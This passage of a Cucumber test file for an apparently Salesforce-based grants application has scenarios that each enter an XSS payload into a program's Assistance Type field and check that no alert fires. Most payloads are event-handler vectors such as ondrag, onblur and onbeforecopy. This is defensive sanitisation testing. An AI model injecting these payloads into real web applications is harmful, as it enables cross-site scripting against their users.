    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                          | Field                  |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301998 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                        | Field                  |
      | <body onafterprint=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302002 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                       | Field                  |
      | <input onauxclick=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302007 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                               | Field                  |
      | <a onbeforecopy="alert(1)" contenteditable>test</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302021 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                              | Field                  |
      | <a onbeforecut="alert(1)" contenteditable>test</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302033 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                            | Field                  |
      | <xss contenteditable onbeforeinput=alert(1)>test | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302033 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                            | Field                  |
      | <xss contenteditable onbeforeinput=alert(1)>test | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302034 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                    | Field                  |
      | <xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302037 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                               | Field                  |
      | <input onchange=alert(1) value=xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302039 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                  | Field                  |
      | <xss onclick="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302044 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                         | Field                  |
      | <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302045 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                        | Field                  |
      | <xss oncontextmenu="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302047 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                          | Field                  |
      | <xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302048 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                         | Field                  |
      | <xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302051 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                          | Field                  |
      | <xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302052 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                  | Field                  |
      | <xss draggable="true" ondrag="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302053 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                     | Field                  |
      | <xss draggable="true" ondragend="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302054 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                  |
      | <xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302055 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                  |
      | <xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302056 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                           | Field                  |
      | <div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302057 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                  |
      | <xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302059 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
